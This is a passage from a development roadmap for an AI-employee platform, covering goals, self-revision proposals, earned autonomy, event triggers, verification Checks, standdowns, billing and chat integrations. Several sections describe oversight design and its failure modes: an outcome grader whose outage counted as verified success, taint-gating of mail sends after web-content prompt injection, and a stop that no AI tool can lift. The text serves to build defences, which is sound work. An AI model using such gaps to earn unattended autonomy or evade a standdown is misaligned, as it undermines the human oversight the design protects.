- [x] Mission, vision, and the employee's active Goals injected into the
      system prompt; the Routine's linked Goal folded into the Run brief and
      into the outcome checker's evidence
- [x] HTTP surface under `/api/companies/:cid/goals` (zod-validated CRUD +
      manual refresh), Members manage goal definitions
- [x] Deferred MCP tools: `list_goals`, `get_goal`, `update_goal_progress`
      (manual-metric goals only — employees report progress, humans set
      intent; each write records AuditEvent + JournalEntry)
- [x] Goals page in the AI nav group: tree with progress bars, create/edit,
      chart binding and owner pickers; Goal picker on Routine settings;
      command-palette entry
- [x] Docs page at `/docs/goals`; tests over progress math, sweep
      transitions, scoping, and prompt/brief folding

### M52 — The improvement loop ✅

Verdicts exist but change nothing: a bad verdict pages a human, and the human
is the only mechanism by which a failing Routine improves — they read the
transcript, diagnose, and edit the Skill by hand. This milestone makes the
workforce its own first-line debugger, keeping every durable edit behind a
human. A **Lesson** (`RunLesson`) is the structured takeaway a restricted
zero-tool reflection turn writes after a failed or off-goal Run — cause, what
to do differently, scope — injected into that Routine's future Run briefs so
the next attempt starts smarter. A **Revision proposal**
(`RevisionProposal`) is M50's deferred "Approval-gated self-modification"
made concrete on the `FinanceProposal` maker-checker spine: an employee (or
its reflection turn) stages a full-body edit to its own Soul, a Skill, or a
Routine brief with rationale and evidence Runs attached; nothing changes
until an owner/admin applies it, and apply/reject is audited.

- [x] `RunLesson` entity (company/employee/routine/run-scoped; cause; advice;
      dismissal) + restricted reflection turn after `off_goal` / `failed`
      Runs, rate-limited per Routine; latest undismissed Lessons folded into
      that Routine's Run briefs; Lessons visible and dismissible on the
      Routine page
- [x] `RevisionProposal` entity (kind `soul` / `skill` / `routine_body` /
      `routine_criteria`; proposed full body; rationale; evidence Run ids;
      pending / applied / rejected) modelled on `FinanceProposal`: AI
      proposes, an owner/admin applies from a review queue with a
      before/after view, apply writes the target body + AuditEvent +
      JournalEntry, reject records why
- [x] Deferred MCP tool `propose_revision` (an employee may propose edits
      only to its own Soul, Skills, and Routines); owners/admins notified on
      new proposals
- [x] Docs at `/docs/improvement`; tests over reflection gating, lesson
      folding, proposal apply/reject authorization and audit
- [x] Runtime checks on Routines (machine-verifiable assertions a Run must
      pass before it may finalize green, with bounded remediation turns) —
      shipped as **Checks** in M58 below, alongside the effect ledger that
      gives the `effect` kind something to assert over

### M53 — Distributed judgment ✅

Replace per-action human gates with human-authored policies plus earned
trust, so approval fatigue stops being the ceiling on autonomy. Promotion is
evidence-backed and human-ratified; demotion is automatic and only ever
tightens. Deliberately narrow first versions throughout — every rung here
widens what an AI may do without a human, so each ships with the smallest
surface that is honestly useful.

**Design calls recorded up front.** (1) Earned autonomy is not a free-form
tier ladder: it is a closed set of **waivers**, each a concrete existing gate
(`browserApprovalRequired` off for a proven employee; `requiresApproval` off
for one consistently-green Routine). Eligibility is computed from the record
M50 already keeps; a threshold crossing raises an **Approval** (kind
`autonomy_promotion`) — the *system's* idea, admin-gated, executing a held
settings change on ✓, which is exactly what Decision log #11 says an Approval
is. Any failed, timed-out, or off-goal Run **immediately revokes** the
employee's waivers and re-arms the gates, notifying the reporting line.
(2) Decision routing never touches Approvals, and answering a Decision still
fires no side effect — anything privileged the asker does with the answer
meets its own gates. A `DecisionPolicy` rule names who may answer for a given
asking employee: the asker's manager-employee via `reportsToEmployeeId`, or a
named senior employee. Human-only remains the default; a routed Decision that
sits unanswered falls back to the human flow on a short fuse. (3) Budgets
start where AI money-out actually exists today: **ad spend**. A `Budget` row
caps authorized ad-spend deltas per calendar month, company-wide or scoped to
one Connection or one employee, enforced at the same seam as the per-Connection
caps; exhaustion hard-refuses the mutation and tells the employee to raise a
Decision — the system never raises a Decision itself, because a Decision is
the employee choosing to stop. (4) The Policy layer is prose injection plus
two mechanical clause kinds — blocked recipient domains at the mail-send
choke point and company-wide forbidden genosyn tools at MCP dispatch — with
violations recorded as `policy.violation` AuditEvents. (5) The taint-aware
turn policy covers the hostile-by-construction sources first: a turn that
ingested **web content** has its mail sends and Routine writes (the classic
injection-persistence sinks) queue an Approval instead of executing.

- [x] **Earned autonomy.** `AutonomyWaiver` entity; eligibility sweep over
      trailing-30-day Runs and Approval outcomes; `autonomy_promotion`
      Approval kind whose execute applies the specific waiver; automatic
      revocation on any failed/timeout/off-goal Run, at the same runner seam
      that triggers reflection; track record + waivers visible on the
      employee page
- [x] **Decision routing.** `DecisionPolicy` rules (asking employee or any →
      manager / named employee); routed Decisions skip the initial human
      bell, brief the decider in a background session, and settle through a
      deferred `decide_decision` tool the routed decider alone may call
      (answer or decline with a reason); decline or a 4-hour fuse falls back
      to the human flow; `Decision.decidedByEmployeeId` renders "answered by
      &lt;employee&gt;" everywhere answers show
- [x] **Ad-spend Budgets.** `Budget` entity (monthly, company-wide or scoped
      to a Connection or employee); enforced beside the per-Connection caps
      wherever an `AdSpendEvent` would be authorized — approval replays
      included; exhaustion refuses loudly and notifies owners once per budget
      per period
- [x] **Policy layer.** `CompanyPolicy` entity (prose injected into every
      employee prompt, above the Soul; blocked recipient domains; forbidden
      tools); enforcement at the mail-send choke point (every sender, the
      Suppression stance) and at MCP dispatch; `policy.violation` AuditEvents;
      `find_tools`/`call_tool` cannot be forbidden
- [x] **Taint-aware turns** (M50's named deferral, narrowest honest cut):
      web-tool dispatch taints the turn's MCP token; a tainted `send_mail` or
      Routine create/update/delete queues an Approval (kind `tainted_tool`)
      that replays the verbatim call server-side on ✓ through a fresh
      employee-authority token; on by default (`config.agent.taintPolicy`)
- [ ] Taint follow-ups, each deliberate: the connector compose tools
      (`gmail_send_message` dispatches through the Integration surface, not
      the static catalogue) and mail bodies as a taint source (today it
      would gate every send-grant employee's every send)

### M54 — Reactivity & long horizons ✅

Companies run on events and on work that outlives a single sitting; the
workforce ran on cron and single-Run lifetimes. Four primitives close that,
each deliberately shaped by what already exists.

**Design calls recorded up front.** (1) Event triggers ride the M31
live-sync spine exactly as it is: coarse `resource.changed` kinds, id-only,
no row data — an event names *what family changed*, never what it said, so
no grant question arises; the fired Run reads through the employee's own
tools. A fired Routine follows the webhook trigger's precedent verbatim,
including the Approval path for gated Routines, and a per-trigger minimum
interval (default 15 minutes) bounds the self-trigger loop a Routine that
writes what it subscribes to would otherwise become. (2) The codebase has
deliberately standardized on fresh briefed sessions over same-transcript
resume four times (decision pickups, handoff and todo kickoffs, AI review
sessions), and M50/M53 already wake employees when a Decision is answered, a
Handoff lands, or mail arrives (Mail rules). The genuinely missing wake is
**time** — so the primitive is a **Wakeup**: an employee schedules a
follow-up session for itself ("check back on the invoice in two days") with
a brief its future self reads, dispatched by the heartbeat. (3) A
**Workstream** is a persistent state document for work spanning many Runs —
the employee becomes its own project state-holder. The state is updated
through its own tool during a Run, and the latest state opens every bound
Routine's brief, replacing journal archaeology as the context seam. (4) An
**Initiative** is proactive work discovery: an employee proposes standing
work with evidence attached; one admin accept materializes the Routine it
specified, owned by the proposing employee. Nothing exists until a human
accepts — the TldrQuestionAction authority stance.

- [x] **Event-triggered Routines.** `RoutineTrigger` rows (kind from the
      live-sync registry, optional scope id, per-trigger min interval);
      dispatch hooks the resource-event flush through a registered sink;
      fires follow the webhook path — Approval for gated Routines,
      `Run.triggerKind: "event"` otherwise; Triggers panel on Routine
      settings
- [x] **Wakeups.** `EmployeeWakeup` entity + deferred `schedule_wakeup` /
      `cancel_wakeup` tools (bounded pending per employee); heartbeat
      dispatch into a background employee-authority session briefed with the
      employee's own note; journal fallback when no model; visible and
      cancellable from the employee page
- [x] **Workstreams.** `Workstream` entity (state doc, status
      `active` / `done` / `abandoned` with a reason, optional bound
      Routine); deferred `create_workstream` / `update_workstream` /
      `list_workstreams` tools; the bound Routine's Run briefs open with the
      latest state; visible on the Routine page
- [x] **Initiatives.** `Initiative` entity (evidence, proposal, the exact
      Routine spec accept would create); deferred `propose_initiative` tool
      with per-employee pending caps and duplicate refusal; admin
      accept/decline queue with bells; accept creates the Routine owned by
      the proposer, audited and journaled

### M58 — Evidence and the stop ✅

Everything the company believed about its own work was a story the model told
about itself. A Run was green because the agent loop returned; M50 was honest
about that and added a second axis, but the checker on that axis was a model
reading a transcript the *first* model wrote — a transcript that recorded no
tool results at all, and that was head-truncated, so on a long Run the ending
did not exist. Worse, the checker's own outage was recorded with the same word
as an honest ambiguity: `unclear`. Every consumer downstream read "we could not
verify" as "verified", so the earned-autonomy sweep counted a provider outage —
and a completed Run nobody ever graded — as clean evidence toward letting an
employee work unattended. A restart at the wrong moment was, literally, a way
to earn trust.

The audit log knew which AI Employee made each mutation and threw it away at
the read seam, carried no Run id at all, and could not be filtered — so "what
did last night touch", the first question anyone asks after a bad autonomous
night, was not a question this product could answer. And when the answer should
have been *stop*, there was nothing to press: a wrong Routine kept firing on its
cron for thirty days, a running Run held its tools until `timeoutSec` expired,
and the only remedies were toggling `enabled` one row at a time — which stops
neither Wakeups, Triggers, mail automations, sequence ticks nor chat — or
deleting the employee outright.

M58 closes the loop the four milestones before it assumed. The server starts
recording what it observed rather than what was narrated; a Routine gets a bar
a model cannot talk its way past; unverified stops counting as verified; and
work gets a stop. The composition is the point: a Routine whose Checks fail is
graded honestly, contracts its own autonomy, earns a Lesson, and after repeated
failure is **stood down** by the same primitive a human presses in a panic —
with the ledger of exactly what the bad window touched one click away.

**Design calls recorded up front.** (1) `Run.status` stays untouched, again.
`completed` keeps meaning "the loop returned" — M50 refused to overload it with
the verdict and this milestone refuses to overload it with Checks.
`checksVerdict` is a third honest axis, and the consequences attach to the axis,
not the status. (2) Checks run **before** finalization and get bounded
remediation rounds, but a remediation round is a *fresh briefed turn*, not a
resumption of the same transcript — the fifth time this codebase has made that
call, and for the same reason: the agent loop copies its message array and
returns only its final text, so same-transcript resume would have to be built
twice, once for the direct loop and once for the Codex app-server. The Run's
existing absolute deadline bounds the whole phase, so `timeoutSec` still means
what it says. (3) An unrunnable required Check is a **failed** Check, never a
skipped one. "We could not verify" reading as "verified" is the bug this
milestone exists to fix; reintroducing it inside the fix would be absurd.
(4) A **Standdown** has no MCP tool in either direction. The roster must not be
able to stand itself down and, far more importantly, must not be able to lift
one. (5) The company-wide **Audit log** stays gated on the `auditLog`
entitlement (M56); a Run's own **Effects** do not. Browsing the whole history is
the paid feature — reading what one Run did is part of trusting the Run at all,
and the thesis fails on Community if the evidence is an upsell. (6) Two new
deferred read-only MCP tools and no new resident ones; `toolBudget.test.ts` is
untouched.

- [x] **The effect ledger.** `AuditEvent` gains `runId` + `conversationId` and
      two indexes. Provenance is **ambient** for the duration of an MCP request
      (`withAuditContext`, `node:async_hooks`) rather than a parameter threaded
      through ~150 write seams, because those seams live in the services the
      handlers call, not only in the handlers — and a ledger silently missing a
      third of its rows is worse than none, since a Check reading it would pass
      a Run that never did the work. The context carries provenance only, never
      actor fields: an ambient `actorEmployeeId` would reclassify a
      member-authority tool call from `user` to `ai`, and a log that blames the
      wrong principal is worse than a thin one. `services/runEffects.ts` reads
      it back; AI-written `JournalEntry` rows finally carry their Run too.
- [x] **The audit log becomes investigable.** `GET /audit` grows its first zod
      query schema — actor kind, AI Employee, action prefix, Run id, date
      window, keyset cursor — hydrates the acting employee's name, and returns
      `{items, nextCursor}`. `AuditActorKind` gains `"ai"`, which is why every
      AI action rendered as "System" until now.
- [x] **Checks.** `RoutineCheck` + `RunCheckResult`, run before finalization
      with up to two bounded remediation rounds inside the Run's own deadline.
      `command` runs in the same bubblewrap boundary as `bash` and
      `repository_run_command` (the spawn is extracted to
      `agent/sandboxCommandRun.ts` so the three cannot drift); `effect` is a
      declarative predicate over the ledger, so Checks are usable on a stock
      `disabled`-mode install rather than being a bubblewrap-only luxury.
      Admin-authored at the route, readable by the employee in its Run brief,
      writable by no tool.
- [x] **The honest green.** The transcript keeps a head *and* a rolling tail,
      so the ending exists; tool results carry a bounded preview instead of
      `ok`; `unverified` becomes a distinct verdict and `Run.outcomeCheckedAt`
      records that a grader ran at all; the verdict prompt opens with a
      server-written evidence block (the ledger + this Run's Check results)
      above the untrusted transcript, and says which is which.
- [x] **Unverified stops earning autonomy.** The trailing-window record counts
      `unverified` and check failures; the promotion gate requires them at
      zero; the per-Routine waiver predicate requires `achieved` rather than
      merely "not off-goal", so a Routine declaring neither criteria nor Checks
      is simply not promotable — the honest answer the old predicate dodged.
      A failed Check contracts autonomy and earns a Lesson exactly like an
      off-goal Run.
- [x] **The re-grade sweep.** Heartbeat phase 12 finishes grading Runs the
      runner never got to — a process that died inside the two-minute verdict
      window used to strand a Run ungraded forever, and an ungraded Run counted
      as clean. Claimed on `outcomeCheckedAt IS NULL` so the sweep and a slow
      in-line check cannot both spend a model turn on one Run. Two new System
      Health probes: `unverified_runs` and `standdowns`.
- [x] **Standdown.** A revocable stop at company / employee / routine scope,
      enforced through a synchronous cached predicate at the two necks every
      wake passes through — `startRoutineRun` and `streamChatWithEmployee` —
      plus retries, Wakeups and Triggers. In-flight Runs are aborted and
      finalize `interrupted`; retries and Wakeups **defer** rather than cancel;
      a skipped scheduled slot still advances `nextRunAt`, so lifting a
      month-old standdown produces no catch-up storm. A `routine` standdown
      does not stop chat; the two wider scopes do, because a stop a human can
      route around by opening a chat window is not a stop.
- [x] **The circuit breaker.** `Routine.consecutiveFailures`, maintained at the
      same runner seam as autonomy demotion — where the evidence exists, not on
      a sweep that might not run. Crossing
      `runtime.containment.routineBreakerThreshold` (default 5, `0` disables,
      edited at Admin → Runtime) stands the Routine down, so a permanently
      broken Routine stops burning model spend every slot for a month.
- [x] **Two deferred read-only tools** — `list_runs` and `get_run_report`. There
      was no run-reading tool in the product at all, so a manager employee
      briefed about a stood-down Routine had nothing to look at. Routine
      serializers also finally expose `checks` and the `goalId` M51 added.
- [x] Docs at `/docs/verification` and `/docs/standdowns`; edits to Routines,
      Autonomy, Improvement and Vocabulary. `HealthCheck` / `InstanceCheck`
      renamed to `HealthProbe` / `InstanceProbe` so **Check** means one thing.

Deliberately **not** in M58, each its own thesis: out-of-band alert delivery (a
company nobody has logged into for thirty days is still unreachable — that is a
*delivery* problem, not an evidence one); aggregate model-spend and throughput
envelopes (the enforcement action a spend envelope needs is now built, so the
seam exists); required Checks on Repository work sessions (same primitive,
different lifecycle); declaring a Routine safe to repeat and gating
effect-bearing retries; the org control loop — goal-drift detection, an
AI-writable `Routine.goalId`, goal-ownership audits, retiring Routines whose
Goal has settled; offboarding an AI Employee; the obligations ledger; a
delegation load meter; company-wide knowledge grant defaults; cash runway and
receivables dunning. Ownership scoping on `delete_routine` is left alone on
purpose: `routinesMcp.test.ts` deliberately pins the opposite behaviour, so
narrowing it is an authority-boundary argument to be made properly rather than
smuggled in — what M58 gives it is that the deletion is now attributable to a
named employee and a specific Run through a filterable read surface, which is
the precondition for having the argument at all.

### M55 — Vertical completeness (planned, pulled by demand)

Independently shippable last-mile verticals, in demand order: Bill Pay with a
payment-rail seam and hard caps; cash-flow forecast and runway guardian;
hosted lead forms + booking links; a Support Desk with SLAs; Monitors /
Incidents / an AI on-call; the contract obligations ledger.

### M56 — Editions, plans & billing ✅

Genosyn grows a commercial spine without closing the source. Three deployment
shapes, one codebase: **Community** (self-hosted, Apache 2.0, free, unlimited — SSO
and the Audit log show an "available in Genosyn Enterprise" card),
**Enterprise** (self-hosted plus a signed license activated at Admin →
License), and **Genosyn Cloud** (the operator enables billing at Admin →
Billing; every company picks a Plan billed through Stripe per AI Employee
hired). See decision 14 for the model.

- [x] **Plans.** Free (1 AI Employee, 2 Routines), Growth ($19 / AI Employee /
      month, unlimited AI Employees and Routines), Scale ($49 / AI Employee /
      month, everything in Growth plus SSO and the Audit log). Constants in
      `services/billing/plans.ts`; `CompanyBilling` row per company.
- [x] **Monthly or annual, ten percent off for the year.** Both paid Plans sell
      on two intervals — Growth $19/mo or $205.20/yr, Scale $49/mo or
      $529.20/yr — so the operator configures four price ids rather than two
      and Settings → Billing carries a Monthly / Annual switch. Annual is
      optional configuration: leave the two annual ids blank and the switch
      never appears. Changing interval on the Plan you already hold reprices
      the existing subscription in place (prorated), never a second one, and
      `CompanyBilling.billingInterval` mirrors whichever price is live. A
      subscription written before this existed has no stored interval and
      reads as monthly, which is what it was.
- [x] **Entitlements.** One resolver (`services/entitlements.ts`) answers
      every gate: billing enabled → the company's Plan; billing disabled →
      the instance license (valid = enterprise, else community, limits always
      unlimited self-hosted). Plan limits enforced at the single employee-hire
      path and every Routine-creation path (UI, template hire capped at
      remaining capacity, MCP `create_routine`, Launch-plan batch, Initiative
      accept); feature gates on the Audit log reader and SSO. 402 with a
      plain-English upgrade message everywhere; `recordAudit` keeps writing
      regardless so history exists the day a company upgrades.
- [x] **Stripe.** Raw-REST client (no SDK): Checkout (subscription mode,
      quantity = AI Employees hired, min 1), billing portal, webhook with
      verified signatures updating the local row, seat quantity re-synced
      best-effort on hire/fire plus webhook plus explicit sync. Configured by
      the operator at Admin → Billing (secret key, webhook secret, four price
      ids — encrypted in `AppSetting`).
- [x] **Enterprise licenses, offline.** `genlic1.<payload>.<sig>` — an
      Ed25519 signature over the license payload (company, email, expiry,
      seats, evaluation), verified against public keys embedded in the app.
      No phone-home: a license validates air-gapped. Issued at Admin →
      Enterprise Licenses on an install holding the signing private key
      (genosyn.com's own cloud; `npm run license:keygen` mints a pair), with
      an issued-license registry (`EnterpriseLicense`). Activated by pasting
      the key at Admin → License. Paid licenses degrade softly on expiry
      (features stay on, the page warns); evaluation licenses expire hard.
- [x] **Per-company SSO on Cloud.** `CompanySso` (Google / any OIDC issuer,
      per-company client + encrypted secret, autoJoin), configured at
      Settings → Single sign-on behind the Scale gate; sign-in at
      `/login/sso/<company>`. Linking an IdP assertion to an existing account
      requires that account's password once — a company's IdP can never
      silently take over a user who also belongs to other companies.
      Auto-provisioned users join as Members. Instance-wide SSO (M16) is
      unchanged on Cloud and license-gated on self-hosted installs.
- [x] **Helm chart.** `Helm/genosyn` — official chart published to
      `oci://ghcr.io/genosyn/charts/genosyn` on release (chart.yml workflow)
      and listed on Artifact Hub: config.js ConfigMap overlay + Secret-fed
      env, bundled Postgres for evaluation, bubblewrap `sandbox.enabled`
      (seccomp Unconfined + procMount Unmasked + `hostUsers: false`), probes
      on the new unauthenticated `GET /api/health`. The Kubernetes docs page
      now leads with it.
- [x] **The chart defaults to production, not to a demo.** `multiTenant`,
      Postgres, and the sandbox are all on out of the box, with chart-managed
      strong instance secrets (generated once, `resource-policy: keep`, never
      rotated on upgrade — rotating the encryption key would orphan every
      ciphertext). Because shared-SaaS boot is fail-closed, a bare
      `helm install` refuses at *template* time with one aggregated message
      naming everything missing at once, rather than crash-looping a pod:
      only the bootstrap master-admin email and system SMTP need supplying.
      The old single-tenant shape lives on in `values-selfhost.yaml`.
- [x] **Home.** genosyn.com/pricing — Cloud plan cards, the self-hosted
      Community/Enterprise split, comparison table, FAQ. Docs for plans &
      billing, enterprise licenses, and the chart.
- [x] **Free is a taste, not a tier.** Beyond 1 AI Employee and 2 Routines,
      the Free plan caps 1 Base with 1 table, 3 Channels (DMs never count),
      1 Project, and 20 Todos — enforced with the same 402-with-upgrade-copy
      seam at every creation path (routes, MCP tools, template seeding
      clamped, Pipeline nodes; recurring Todos stop spawning at the cap
      rather than failing the completing PATCH). Self-hosted stays unlimited.
      The pricing page leads with the value frame — an employee-grade hire
      for $19 a month, not thousands — instead of a bare per-unit price.

### M57 — config.ts is boot only ✅

An operator should not edit a file and restart a container to change how
often a mailbox polls. `config.ts` went from 293 lines to 129: it now holds
secrets, database coordinates, and the fail-closed security posture, and
nothing else.

- [x] **Runtime settings.** `services/runtimeSettings.ts` owns one
      `runtime.*` `AppSetting` row per group — web tools, mail sync,
      meetings, browser, agent (taint policy, member browsers, tool
      discovery) — with tolerant per-field parsing (a corrupt value falls
      back to its default rather than taking the group down) and one shared
      30s refresh behind synchronous getters, the `publicUrl` pattern. Edited
      at **Admin → Runtime**, per-group save and reset-to-defaults.
- [x] **Two settings stopped being frozen at boot.** The meetings heartbeat
      read its interval at module load and the recording cap was baked into
      multer at route construction; both now read live, so toggling meetings
      off stops the work without a restart.
- [x] **Deleted rather than moved.** The `smtp` block was a legacy fallback
      behind the DB transport — and a plaintext password in a file baked into
      the image. `integrations.google` had no runtime consumers at all.
- [x] **Nobody's install changes under them.** `importLegacyConfigOverrides()`
      runs once at boot: any removed block still present in the object — an
      unedited source install, or a Kubernetes ConfigMap rendering the old
      `config.js` — is written into the database with that install's exact
      effective values, then ignored forever. Extra keys are inert; nothing
      enumerates the config object.
- [x] **The multi-tenant SMTP requirement stopped being fatal.** It now warns
      loudly instead of refusing to boot, because a fresh cloud install has
      to reach the dashboard that configures SMTP. Verification links print
      to the server log until it is set.

### M59 — External chat surfaces ✅

An AI Employee people have to open a web app to reach is one they forget they
have. Every surface before this one assumed the human would come to Genosyn,
and colleagues do not come to things — they answer where the notification
already is. The workforce was exactly as present as the tab it lived in,
which is to say gone by lunchtime. M59 makes an AI Employee reachable from
Slack, Microsoft Teams, WhatsApp and Telegram, and takes as little of Genosyn
out there with it as the job allows.

An Integration Connection for one of those four providers *is* a chat
surface. One shared inbound core (`services/chatSurfaces/inbound.ts`) owns
everything that decides what the employee may do — identity, authority, which
Conversation an upstream thread maps to, the replay window, replay
suppression, and the per-thread serialization that stops two messages in one
conversation from racing their answers onto a transcript neither has seen. An
adapter translates its platform's envelope and is allowed to decide nothing;
an adapter that wanted to decide one of those questions for itself is the bug
the split exists to prevent. Telegram had already shipped as a ~370-line
listener and was moved **onto** the contract rather than left running beside
it, because almost none of those lines were about Telegram — and because a
seam only one thing uses is not a seam: it is the shape one implementation
happens to have, which the second implementation then quietly bends.

**The identity decision is the substance of the milestone.** External chat
reaches `chatWithEmployee` with no browser session, so every Telegram turn
this product had ever served ran untrusted — and
`resolveInteractiveChatContextAccess` gives an untrusted turn no Soul, no
Skills, no Goals, no Policies and no company tools. That is the right posture
for a stranger who found a public bot, and a useless one for the colleague
who typed the same sentence from the next desk: they got a generic model
wearing the company's name. `ExternalChatIdentity` is the difference, and
what it refuses to accept as proof is the whole argument. **Never a
platform-reported email.** Slack Connect and Microsoft Teams federation both
put other tenants' people in the room carrying addresses their own tenant
vouched for, so matching on one is privilege escalation into the company's
tools behind a badge Genosyn did not issue. The only bind is a one-time link
the bot replies with, opened in a browser where the human is already signed
in — the session is the proof, and checking a session is the one thing
Genosyn has always known how to do. Membership is re-read on every single
turn, so removing someone from the company revokes their Slack authority on
their next message, with no cleanup step for anybody to remember.

**Design calls recorded up front.** (1) Reachability splits the four in half,
and the split is a property of the platforms rather than a preference:
Telegram long-polls and Slack offers Socket Mode, so both dial out and work
from a laptop behind NAT, while Microsoft Teams and WhatsApp are webhook-only
and have to be dialled into. Their catalog cards therefore disable themselves
until Admin → General → Public URL is set, rather than letting an operator
connect a bot that will never hear anything. (2) Approvals and Standdowns
deliberately do not travel. An Approval is admin-gated and its summary is
redacted before it renders anywhere; a chat surface is precisely the place
where nobody can say who else is in the channel or reading over a shoulder.
A Standdown is the panic button, and a stop that can be pressed from a room
Genosyn does not authenticate is not a stop. Both keep their home in the app
and the reply says so. (3) In a group or channel the AI Employee answers only
when it is addressed; in a DM it answers everything, because a DM is already
the addressing. (4) WhatsApp's 24-hour window is a named product constraint,
not a bug to be worked around: outside 24 hours from a person's last inbound
message Meta accepts nothing but a template it has already approved, so the
catalog copy, the tool descriptions and the error mapping all say it out loud
before an employee can promise a proactive update the surface cannot send.

- [x] **The shared inbound core.** Identity, then authority, then responder,
      then transcript, then reply — one copy of that sequence, identical
      whether the message arrived over a Slack socket, a Microsoft Teams
      webhook or a Telegram long poll, so a fifth surface cannot ship with a
      weaker version of it. A `@employee-slug` prefix routes to a different
      AI Employee, but only one already granted the Connection, so the prefix
      is a hint and never a way to reach an employee the company did not put
      on this surface. Conversations key on
      `source` + `connectionId` + `externalKey` (a Slack threaded reply gets
      its own transcript rather than a merged blob); a group thread never
      adopts an owner, because a transcript several people can read must not
      become one Member's private history; and the 24-turn replay window
      mirrors the web route's exactly.
- [x] **Binding.** An `ExternalChatIdentity` row exists from a sender's first
      sighting with no user attached, so a pending stranger is visible in the
      app and a link can be re-minted without losing their label. The link is
      single-use, hashed at rest, good for fifteen minutes, and offered again
      only once the last one lapsed, so an unbound conversation gets an
      occasional footer rather than a nag on every message. The bind route
      takes the Member from the browser session and never from the payload,
      and refuses an API key outright — a company credential proves nothing
      about who is holding it. Admins see the roster of who is behind which
      handle; an admin or the bound Member may cut a binding, and a Member
      who is not the bound one may not, because that would be revoking a
      colleague's access. Both bind and unbind are audited.
- [x] **Three things a link must not be.** An adversarial review of this
      milestone found the same shape three times over, and each answer is
      load-bearing. A bind link is *never* posted into a group thread: it
      claims one specific external sender, so whoever opens it donates their
      own authority to that sender, and putting that in a channel is a
      standing offer of a colleague's access to everyone in the room — a
      group gets an instruction to DM instead. The page does *not* bind on
      load: it names the surface and the external handle first and waits for
      a click, because a link is the easiest thing in the world to forward
      and "you opened a URL" is not consent. And the Member's auth epoch is
      pinned at bind time rather than re-read live, so signing out everywhere
      or resetting a password revokes external chat too — reading
      `User.sessionVersion` and handing it straight to the check that
      compares against `User.sessionVersion` is not a check. Re-proving is
      one click, and the AI Employee offers it unprompted on the next
      message.
- [x] **Four adapters, one contract.** Slack ships both transports — Socket
      Mode when an app-level token is configured, the Events API with v0
      signature verification over the raw bytes for operators who would
      rather point Slack at a URL. Microsoft Teams verifies Bot Framework
      RS256 against Microsoft's published JWKS with the issuer, audience,
      validity window and `serviceUrl` binding all checked, because Microsoft
      signs for every bot in the world with the same keys. WhatsApp verifies
      Meta's signature and answers the `hub.challenge` handshake. Each
      renders markdown down to what its client actually understands rather
      than shipping asterisks to people.
- [x] **Telegram stops shouting.** The shipped listener answered *every* post
      in any group the bot sat in, which is how a helpful bot becomes the one
      the channel mutes. The adapter answers only when addressed — an
      @-mention of its own handle, or a reply to something it said — and
      still answers everything in a DM.
- [x] **One process per bot.** Long-running transports are owned through a
      scheduler lease per Connection: two replicas polling one Telegram bot
      is a 409 from Telegram, and two Slack sockets are two answers to one
      question. A replica that loses the race retries, which is also how
      failover works when the holder dies.
- [x] **The operator's half.** The four catalog cards, with the webhook URL
      to paste and a plain statement when it will not work yet; the identity
      roster; the bind page the link out of Slack lands on; and docs for
      connecting each surface and for what an unbound sender does and does
      not get.

Deliberately **not** in M59, each with a reason. Per-employee bot users: one
Connection answers as the employee granted it, and giving every AI Employee
its own Slack identity is an app-installation and token problem rather than a
routing one. Block Kit and Adaptive Card rendering, so a Decision could be
answered from the channel instead of read there as prose. Per-sender rate
limiting on an unbound stranger's turns — today an unbound sender can drive
model spend, bounded only by how small an untrusted context is, which is a
real cost with a real ceiling rather than a hole, and the honest fix is a
spend envelope rather than a counter bolted to one surface. And two-way
mirroring of Workspace channels, which stays out on purpose: loop suppression
and edit semantics would cost a quarter and the thing at the end of it would
be a second Workspace beside the one that already exists.

### M60 — Any mailbox, from an address ✅

The Email section was the best thing in this product that most installs could
not use. It spoke Gmail and only Gmail, and getting to the Gmail it did speak
took, on a fresh self-hosted install, about twenty-eight actions across two
personas, five in-app screens and eight Google Cloud Console steps — three of
which (consent-screen configuration, External + Testing test-user enrolment,
and restricted-scope review for `gmail.modify`) appeared nowhere in the
product, so the first attempt failed at Google with copy Genosyn had never
predicted. A company on Fastmail, iCloud, Zoho or its own Exchange server
could not get in at all. Nowhere in any of it did the product ask for the one
fact the person actually had: their email address.

M60 makes that the first and usually the only question. Type an address,
press Continue. `services/mail/discovery.ts` resolves it down a ladder —
a built-in table of the domains most mail lives on, then MX records (which is
how a company domain hosted by Google Workspace or Microsoft 365 gives itself
away), then RFC 6186 `_imaps`/`_submission` SRV records, then Thunderbird
autoconfig, then a named guess — and the form becomes either one
**Continue with Google** button or a password field with the right servers
already in it. Every network step is injected, so the whole decision table is
unit-tested without DNS.

**The second provider is IMAP/SMTP, and that is the unlock.** It needs
nothing registered with anyone: an address and an app password, and the Email
section works on Fastmail, iCloud, Yahoo, Zoho, GMX, Yandex, mailbox.org,
Migadu, Titan, a corporate Exchange server, or a Dovecot box somebody runs
themselves. Gmail can use it too, with a Google App password, for the install
whose operator will never open a cloud console. Both halves of the credential
are proved before anything is stored, separately, because IMAP and SMTP fail
independently and for different reasons — a Microsoft 365 tenant routinely
leaves one on and the other off, and discovering that the first time somebody
presses Send is a lost reply.

**The shape of the change is a seam, not a fork.** `Mailbox`
(`services/mail/mailbox/types.ts`) is a *semantic* interface — `archive`,
`setFlagged`, `trash` — because `modifyThread(token, id, [], ["INBOX"])` reads
fine while Gmail is the only mailbox in the product and becomes a wall the
moment it is not. Shared code names methods; each adapter decides what they
mean upstream. Two things did **not** get generalised, deliberately. The
mirror keeps one canonical label vocabulary (Gmail's own system ids, chosen
because no live data had to migrate) and the IMAP adapter derives it from
folders and flags, so the sidebar counts, the search grammar, the rule engine
and every MCP tool kept working untouched. And the Gmail sync engine stayed
exactly as it was: IMAP's state is per folder, has no history log, and is
walked as UID ranges, so it got its own engine (`services/mail/imapSync.ts`)
sharing the account state machine, the leases, the cancellation fence and the
mirror write path — rather than a parameterised engine whose every branch
existed for one caller and whose first regression would land on a mailbox
that already worked.

Two identity problems are the substance of the IMAP side. A message's UID
changes every time it moves between folders, so the mirror keys rows on the
`Message-ID` and records the changeable address separately
(`MailMessage.providerLocation`) — a UID-keyed mirror would lose a message the
first time anybody archived it. And IMAP has no thread ids, so a conversation
is the hash of the root of the `References` chain: stateless, which is what
makes a resumable, restartable, out-of-order backfill possible at all.

Also in: connecting from the Email section links the mailbox at the OAuth
callback (`OauthState.linkMailbox`), so approving Google's consent screen is
the last step rather than the middle one; one connect component replaces the
three copies of the old candidate picker; and MIME composition moved out of
the Gmail client into a transport-neutral `services/mail/mime.ts` that now
also stamps `From`, `Date` and a locally-generated `Message-ID`, because an
